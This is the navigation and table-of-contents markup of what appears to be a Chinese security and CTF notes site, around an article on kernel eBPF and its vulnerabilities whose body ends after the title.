<nav aria-expanded="false" aria-labelledby="__nav_4_3_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_4_3">
<span class="md-nav__icon md-icon"></span>
            网络运维
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/network/basic/">
<span class="md-ellipsis">
    基本配置与工具
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/network/clash/">
<span class="md-ellipsis">
    Clash 代理配置
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/network/tunnel/">
<span class="md-ellipsis">
    内网穿透与代理
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/network/server/">
<span class="md-ellipsis">
    Web 服务器相关
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_4_4" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../devops/protocol/">
<span class="md-ellipsis">
    网络协议
    
  </span>
</a>
<label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_4_4_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_4_4">
<span class="md-nav__icon md-icon"></span>
            网络协议
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/protocol/vmess/">
<span class="md-ellipsis">
    VMess
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_4_5" type="checkbox"/>
<label class="md-nav__link" for="__nav_4_5" id="__nav_4_5_label" tabindex="0">
<span class="md-ellipsis">
    前端技术
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_4_5_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_4_5">
<span class="md-nav__icon md-icon"></span>
            前端技术
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/frontend/css/">
<span class="md-ellipsis">
    CSS
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/frontend/svg/">
<span class="md-ellipsis">
    SVG
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_4_6" type="checkbox"/>
<label class="md-nav__link" for="__nav_4_6" id="__nav_4_6_label" tabindex="0">
<span class="md-ellipsis">
    排版写作规范
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_4_6_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_4_6">
<span class="md-nav__icon md-icon"></span>
            排版写作规范
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/typesetting/clreq/">
<span class="md-ellipsis">
    中文排版需求
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../devops/typesetting/tech/">
<span class="md-ellipsis">
    中文技术文档风格指南
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_5" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../ctf/">
<span class="md-ellipsis">
    CTF
    
  </span>
</a>
<label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_5_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_5">
<span class="md-nav__icon md-icon"></span>
            CTF
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested md-nav__item--section">
<input class="md-nav__toggle md-toggle" id="__nav_5_2" type="checkbox"/>
<label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
<span class="md-ellipsis">
    misc
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_5_2_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_5_2">
<span class="md-nav__icon md-icon"></span>
            misc
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_5_2_1" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../ctf/misc/steg/">
<span class="md-ellipsis">
    隐写术
    
  </span>
</a>
<label class="md-nav__link" for="__nav_5_2_1" id="__nav_5_2_1_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_5_2_1_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_5_2_1">
<span class="md-nav__icon md-icon"></span>
            隐写术
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/misc/steg/image/">
<span class="md-ellipsis">
    图片隐写
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/misc/steg/audio/">
<span class="md-ellipsis">
    音频隐写
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_5_2_2" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../ctf/misc/escapes/">
<span class="md-ellipsis">
    沙箱逃逸
    
  </span>
</a>
<label class="md-nav__link" for="__nav_5_2_2" id="__nav_5_2_2_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_5_2_2_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_5_2_2">
<span class="md-nav__icon md-icon"></span>
            沙箱逃逸
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/misc/escapes/pysandbox/">
<span class="md-ellipsis">
    Python 沙箱逃逸
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_5_2_3" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../ctf/misc/forensics/">
<span class="md-ellipsis">
    取证
    
  </span>
</a>
<label class="md-nav__link" for="__nav_5_2_3" id="__nav_5_2_3_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_5_2_3_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_5_2_3">
<span class="md-nav__icon md-icon"></span>
            取证
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/misc/forensics/mem/">
<span class="md-ellipsis">
    内存取证
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_5_2_4" type="checkbox"/>
<label class="md-nav__link" for="__nav_5_2_4" id="__nav_5_2_4_label" tabindex="0">
<span class="md-ellipsis">
    编码/密码类
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_5_2_4_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_5_2_4">
<span class="md-nav__icon md-icon"></span>
            编码/密码类
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/misc/coding/">
<span class="md-ellipsis">
    编码及古典密码
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/misc/qrcode/">
<span class="md-ellipsis">
    QRCode
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/misc/esolang/">
<span class="md-ellipsis">
    Esolang
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_5_2_5" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../ctf/blockchain/">
<span class="md-ellipsis">
    Blockchain
    
  </span>
</a>
<label class="md-nav__link" for="__nav_5_2_5" id="__nav_5_2_5_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_5_2_5_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_5_2_5">
<span class="md-nav__icon md-icon"></span>
            Blockchain
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_5_2_5_2" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../ctf/blockchain/eth/">
<span class="md-ellipsis">
    Ethereum
    
  </span>
</a>
<label class="md-nav__link" for="__nav_5_2_5_2" id="__nav_5_2_5_2_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_5_2_5_2_label" class="md-nav" data-md-level="4">
<label class="md-nav__title" for="__nav_5_2_5_2">
<span class="md-nav__icon md-icon"></span>
            Ethereum
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/blockchain/eth/basic/">
<span class="md-ellipsis">
    以太坊基础
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/blockchain/eth/evm/">
<span class="md-ellipsis">
    以太坊虚拟机
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/blockchain/eth/solidity/">
<span class="md-ellipsis">
    Solidity 语言
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/blockchain/eth/yul/">
<span class="md-ellipsis">
    Yul 语言
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/blockchain/eth/vuln/">
<span class="md-ellipsis">
    常见合约漏洞攻击手段
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/blockchain/eth/erc/">
<span class="md-ellipsis">
    ERC 标准
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../ctf/blockchain/eth/eip/">
<span class="md-ellipsis">
    其余重要 EIPs
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_5_2_5_3" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../ctf/blockchain/solana/">
<span class="md-ellipsis">
    Solana
    
  </span>
</a>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_5_2_5_3_label" class="md-nav" data-md-level="4">
<label class="md-nav__title" for="__nav_5_2_5_3">
<span class="md-nav__icon md-icon"></span>
            Solana
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
</ul>
</nav>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested md-nav__item--section">
<input class="md-nav__toggle md-toggle" id="__nav_5_3" type="checkbox"/>
<label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
<span class="md-ellipsis">
    pwn
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_5_3_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_5_3">
<span class="md-nav__icon md-icon"></span>
            pwn
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_5_3_1" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../ctf/pwn/stack/">
<span class="md-ellipsis">
    栈漏洞利用
    
  </span>
</a>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_5_3_1_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_5_3_1">
<span class="md-nav__icon md-icon"></span>
            栈漏洞利用
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_5_3_2" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../ctf/pwn/heap/">
<span class="md-ellipsis">
    堆漏洞利用
    
  </span>
</a>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_5_3_2_label" class="md-nav" data-md-level="3">
<label class="md-nav__title" for="__nav_5_3_2">
<span class="md-nav__icon md-icon"></span>
            堆漏洞利用
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
</ul>
</nav>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_6" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../writeups/">
<span class="md-ellipsis">
    Writeups
    
  </span>
</a>
<label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_6_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_6">
<span class="md-nav__icon md-icon"></span>
            Writeups
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_6_2" type="checkbox"/>
<label class="md-nav__link" for="__nav_6_2" id="__nav_6_2_label" tabindex="0">
<span class="md-ellipsis">
    Training
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_6_2_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_6_2">
<span class="md-nav__icon md-icon"></span>
            Training
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/ethernaut/">
<span class="md-ellipsis">
    Ethernaut
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/SecurityInnovation/">
<span class="md-ellipsis">
    Security Innovation
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/sadservers/">
<span class="md-ellipsis">
    SadServers
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/AAA/">
<span class="md-ellipsis">
    🔒 AAA School Bus
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_6_3" type="checkbox"/>
<label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
<span class="md-ellipsis">
    2021
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_6_3_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_6_3">
<span class="md-nav__icon md-icon"></span>
            2021
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/sysu_msc_puzzle/">
<span class="md-ellipsis">
    SYSU MSC Puzzle 2021
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/hackergame2021/">
<span class="md-ellipsis">
    USTC Hackergame 2021
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/d0g3/">
<span class="md-ellipsis">
    第四届“安洵杯”
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/bytectf2021_final/">
<span class="md-ellipsis">
    ByteCTF 2021 Final
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/sctf2021/">
<span class="md-ellipsis">
    SCTF 2021
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_6_4" type="checkbox"/>
<label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
<span class="md-ellipsis">
    2022
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_6_4_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_6_4">
<span class="md-nav__icon md-icon"></span>
            2022
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/vnctf2022/">
<span class="md-ellipsis">
    VNCTF 2022
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/tqlctf2022/">
<span class="md-ellipsis">
    TQLCTF 2022
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/susctf2022/">
<span class="md-ellipsis">
    SUSCTF 2022
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/d3ctf2022/">
<span class="md-ellipsis">
    D3CTF 2022
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/%2Actf2022/">
<span class="md-ellipsis">
    *CTF 2022
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/mrctf2022/">
<span class="md-ellipsis">
    MRCTF 2022
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/qwb2022/">
<span class="md-ellipsis">
    强网杯 2022 Quals
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/tctf2022/">
<span class="md-ellipsis">
    TCTF/0CTF 2022
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/hackergame2022/">
<span class="md-ellipsis">
    USTC Hackergame 2022
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/n1ctf2022/">
<span class="md-ellipsis">
    N1CTF 2022
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/seccon2022/">
<span class="md-ellipsis">
    SECCON 2022 Quals
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/rctf2022/">
<span class="md-ellipsis">
    RCTF 2022
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_6_5" type="checkbox"/>
<label class="md-nav__link" for="__nav_6_5" id="__nav_6_5_label" tabindex="0">
<span class="md-ellipsis">
    2023
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_6_5_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_6_5">
<span class="md-nav__icon md-icon"></span>
            2023
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/seccon2022final/">
<span class="md-ellipsis">
    SECCON 2022 Final
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/xctf2022final/">
<span class="md-ellipsis">
    XCTF 2022 Final
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/midnight2023/">
<span class="md-ellipsis">
    MidnightSun 2023 Quals
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/aliyunctf2023/">
<span class="md-ellipsis">
    AliyunCTF 2023
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/ciscn2023/">
<span class="md-ellipsis">
    CISCN 2023 Quals
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/seccon2023/">
<span class="md-ellipsis">
    SECCON 2023 Quals
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../writeups/tpctf2023/">
<span class="md-ellipsis">
    TPCTF 2023
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_7" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../others/">
<span class="md-ellipsis">
    Others
    
  </span>
</a>
<label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_7_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_7">
<span class="md-nav__icon md-icon"></span>
            Others
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../others/notes/">
<span class="md-ellipsis">
    课程笔记
    
  </span>
</a>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_7_3" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../others/subs/">
<span class="md-ellipsis">
    字幕制作系列
    
  </span>
</a>
<label class="md-nav__link" for="__nav_7_3" id="__nav_7_3_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_7_3_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_7_3">
<span class="md-nav__icon md-icon"></span>
            字幕制作系列
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../others/subs/ass/">
<span class="md-ellipsis">
    ass 标签
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../others/subs/aegisub/automation/">
<span class="md-ellipsis">
    Aegisub 自动化
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../others/subs/aegisub/karaoke/">
<span class="md-ellipsis">
    Aegisub 卡拉 OK 模板
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../others/subs/ffmpeg/">
<span class="md-ellipsis">
    ffmpeg 套件杂记
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_7_4" type="checkbox"/>
<div class="md-nav__link md-nav__container">
<a class="md-nav__link" href="../../../others/troubleshooting/">
<span class="md-ellipsis">
    TroubleShooting
    
  </span>
</a>
<label class="md-nav__link" for="__nav_7_4" id="__nav_7_4_label" tabindex="0">
<span class="md-nav__icon md-icon"></span>
</label>
</div>
<nav aria-expanded="false" aria-labelledby="__nav_7_4_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_7_4">
<span class="md-nav__icon md-icon"></span>
            TroubleShooting
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../others/troubleshooting/mac/">
<span class="md-ellipsis">
    macOS TroubleShooting
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav aria-label="目录" class="md-nav md-nav--secondary">
<label class="md-nav__title" for="__toc">
<span class="md-nav__icon md-icon"></span>
      目录
    </label>
<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_1">
<span class="md-ellipsis">
      eBPF 起源与简介
    </span>
</a>
<nav aria-label="eBPF 起源与简介" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#bpf">
<span class="md-ellipsis">
      BPF
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_2">
<span class="md-ellipsis">
      eBPF
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_3">
<span class="md-ellipsis">
      eBPF 原理与安全设计
    </span>
</a>
<nav aria-label="eBPF 原理与安全设计" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_4">
<span class="md-ellipsis">
      eBPF 运行逻辑
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_5">
<span class="md-ellipsis">
      eBPF 安全设计
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_6">
<span class="md-ellipsis">
      eBPF 技术相关安全漏洞分析
    </span>
</a>
<nav aria-label="eBPF 技术相关安全漏洞分析" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#cve-2020-8835">
<span class="md-ellipsis">
      CVE-2020-8835
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#cve-2020-27194">
<span class="md-ellipsis">
      CVE-2020-27194
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#cve-2021-3490">
<span class="md-ellipsis">
      CVE-2021-3490
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#cve-2022-23222">
<span class="md-ellipsis">
      CVE-2022-23222
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_7">
<span class="md-ellipsis">
      eBPF 安全漏洞总结
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf_8">
<span class="md-ellipsis">
      eBPF 漏洞提权利用分析
    </span>
</a>
<nav aria-label="eBPF 漏洞提权利用分析" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#_1">
<span class="md-ellipsis">
      地址泄漏原理
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_2">
<span class="md-ellipsis">
      任意地址读原理
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_3">
<span class="md-ellipsis">
      任意地址写原理
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#exp">
<span class="md-ellipsis">
      exp 程序分析
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_4">
<span class="md-ellipsis">
      利用结果
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf-rootkit">
<span class="md-ellipsis">
      eBPF rootkit 安全威胁分析
    </span>
</a>
<nav aria-label="eBPF rootkit 安全威胁分析" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#ebpf-rootkit_1">
<span class="md-ellipsis">
      eBPF rootkit 原理
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#bad-bpf">
<span class="md-ellipsis">
      bad-bpf 程序复现
    </span>
</a>
<nav aria-label="bad-bpf 程序复现" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#_5">
<span class="md-ellipsis">
      隐藏进程
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_6">
<span class="md-ellipsis">
      劫持新建进程
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_7">
<span class="md-ellipsis">
      用户提权
    </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_8">
<span class="md-ellipsis">
      总结
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_9">
<span class="md-ellipsis">
      参考文献及资料
    </span>
</a>
</li>
</ul>
</nav>
</div>
</div>
</div>
<script defer="" src="/js/toc.js"></script>
<link href="/css/fold_toc.css" rel="stylesheet"/>
<div class="md-content" data-md-component="content">
<article class="md-content__inner md-typeset">
<h1 id="ebpf">内核<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>技术简介与安全漏洞分析<a class="headerlink" href="#ebpf" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
